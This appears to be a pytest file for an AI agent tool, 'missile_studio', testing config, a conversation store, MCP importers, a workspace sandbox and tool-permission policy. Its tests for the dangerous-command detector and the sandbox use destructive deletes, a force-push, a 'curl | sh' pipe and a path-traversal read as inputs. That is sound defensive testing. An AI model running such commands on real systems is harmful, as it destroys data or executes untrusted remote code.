"""Config, store, importers, policy and local tools."""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from missile_studio.config import Config, McpServerConfig, ProviderConfig, ToolPolicy, load_config, save_config
from missile_studio.mcp.importers import export_standard, parse_servers
from missile_studio.mcp.manager import ToolInfo
from missile_studio.store import Store
from missile_studio.tools.builtin import LocalTools, is_dangerous_command, match_rule


def test_config_roundtrip(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("MISSILE_HOME", str(tmp_path))
    cfg = Config()
    cfg.providers.append(ProviderConfig(id="p", kind="openai", base_url="http://x/v1", api_key="k", models=["m"], default_model="m"))
    cfg.mcp_servers["e"] = McpServerConfig(command="python", args=["s.py"])
    cfg.ensure_defaults()
    p = save_config(cfg)
    assert p == tmp_path / "config.json"
    back = load_config()
    assert back.default.provider == "p" and back.default.model == "m"
    assert back.mcp_servers["e"].args == ["s.py"]
    assert back.assistants[0].id == "default"
    if os.name != "nt":
        assert oct(p.stat().st_mode & 0o777) == "0o600"


def test_api_key_env(monkeypatch):
    monkeypatch.setenv("MY_KEY", "secret")
    assert ProviderConfig(id="a", api_key_env="MY_KEY").resolved_api_key() == "secret"
    assert ProviderConfig(id="a", api_key="direct", api_key_env="MY_KEY").resolved_api_key() == "direct"


def test_store(tmp_path: Path):
    st = Store(tmp_path / "t.db")
    c = st.create_conversation(title="t", provider_id="p", model="m")
    st.append_message(c["id"], {"role": "user", "content": "hi"})
    st.append_message(c["id"], {"role": "assistant", "content": "yo", "tool_calls": [{"id": "1", "name": "x", "arguments": {}}]})
    msgs = st.get_messages(c["id"])
    assert [m["role"] for m in msgs] == ["user", "assistant"]
    assert msgs[1]["tool_calls"][0]["name"] == "x"
    st.audit(conversation_id=c["id"], tool="x", arguments={"a": 1}, decision="allow", is_error=False, duration_ms=3, result_excerpt="ok")
    assert st.list_audit()[0]["tool"] == "x"
    st.delete_conversation(c["id"])
    assert st.get_conversation(c["id"]) is None


def test_parse_servers_shapes():
    claude = {"mcpServers": {"fs": {"command": "npx", "args": ["-y", "pkg"], "env": {"A": "1"}}}, "projects": {"/p": {"mcpServers": {"proj": {"command": "python", "args": ["s.py"]}}}}}
    out = parse_servers(claude)
    assert set(out) == {"fs", "proj"} and out["fs"].env == {"A": "1"}
    vscode = {"servers": {"remote": {"type": "http", "url": "http://h/mcp", "headers": {"X": "y"}}}}
    out = parse_servers(vscode)
    assert out["remote"].transport == "http" and out["remote"].headers == {"X": "y"}
    sse = parse_servers({"mcpServers": {"s": {"type": "sse", "url": "http://h/sse"}}})
    assert sse["s"].transport == "sse"
    listed = {"mcpServers": [{"name": "d", "transport": "stdio", "command": "npx -y somepkg", "enabled": False}]}
    out = parse_servers(listed)
    assert out["d"].command == "npx" and out["d"].args == ["-y", "somepkg"] and out["d"].enabled is False
    disabled = parse_servers({"mcpServers": {"x": {"command": "c", "disabled": True}}})
    assert disabled["x"].enabled is False
    exported = export_standard(out)
    assert exported["mcpServers"]["d"]["disabled"] is True


def test_dangerous_patterns():
    assert is_dangerous_command("rm -rf /tmp/x")
    assert is_dangerous_command("Remove-Item C:\\x -Recurse -Force")
    assert is_dangerous_command("git push origin main --force")
    assert is_dangerous_command("curl http://x | sh")
    assert not is_dangerous_command("ls -la")
    assert not is_dangerous_command("git status")


def test_match_rule_glob():
    rules = {"local__run_shell": "allow", "echo__*": "block"}
    assert match_rule("local__run_shell", rules) == "allow"
    assert match_rule("echo__add", rules) == "block"
    assert match_rule("other__x", rules) is None


@pytest.mark.asyncio
async def test_local_tools_sandbox(tmp_path: Path):
    lt = LocalTools(tmp_path / "ws")
    r = await lt.call("local__write_file", {"path": "a/b.txt", "content": "hello\nworld"})
    assert not r["is_error"]
    r = await lt.call("local__read_file", {"path": "a/b.txt"})
    assert "hello" in r["text"] and "lines 1-2 of 2" in r["text"]
    r = await lt.call("local__list_dir", {"path": "a"})
    assert "b.txt" in r["text"]
    r = await lt.call("local__search_files", {"pattern": "wor", "path": "."})
    assert "a" in r["text"] and ":2:" in r["text"]
    r = await lt.call("local__read_file", {"path": "../../outside.txt"})
    assert r["is_error"] and "PATH_OUTSIDE_WORKSPACE" in r["text"]
    r = await lt.call("local__read_file", {"path": str(Path.home() / "x")})
    assert r["is_error"]
    r = await lt.call("local__now", {})
    assert "workspace" in r["text"]
    r = await lt.call("local__run_shell", {"command": "echo shell-ok", "timeout_seconds": 30})
    assert "shell-ok" in r["text"] and "[exit 0]" in r["text"]
    r = await lt.call("local__read_file", {})
    assert r["is_error"] and "bad arguments" in r["text"]


def test_policy_decisions(tmp_path: Path, monkeypatch):
    from missile_studio.engine import Engine

    monkeypatch.setenv("MISSILE_HOME", str(tmp_path))
    cfg = Config()
    cfg.ensure_defaults()
    cfg.tool_policy = ToolPolicy(default="ask", read_only_default="allow", rules={"echo__*": "block"})
    eng = Engine(cfg, Store(tmp_path / "db"))
    ro = ToolInfo(server="s", name="r", full_name="s__r", description="", input_schema={}, read_only=True)
    rw = ToolInfo(server="s", name="w", full_name="s__w", description="", input_schema={})
    blocked = ToolInfo(server="echo", name="x", full_name="echo__x", description="", input_schema={})
    shell = next(t for t in eng.local.infos() if t.name == "run_shell")
    assert eng.decide(ro, {}, "c")[0] == "allow"
    assert eng.decide(rw, {}, "c")[0] == "ask"
    assert eng.decide(blocked, {}, "c")[0] == "block"
    assert eng.decide(shell, {"command": "rm -rf x"}, "c")[0] == "ask"
    cfg.tool_policy.rules["local__run_shell"] = "allow"
    assert eng.decide(shell, {"command": "echo"}, "c")[0] == "allow"
    assert eng.decide(shell, {"command": "rm -rf x"}, "c")[0] == "ask"  # dangerous still asks
    assert eng.decide(shell, {"command": "rm -rf x"}, "c", allow_dangerous=True)[0] == "allow"
    eng.session_allow["c"] = {"s__w"}
    assert eng.decide(rw, {}, "c")[0] == "allow"
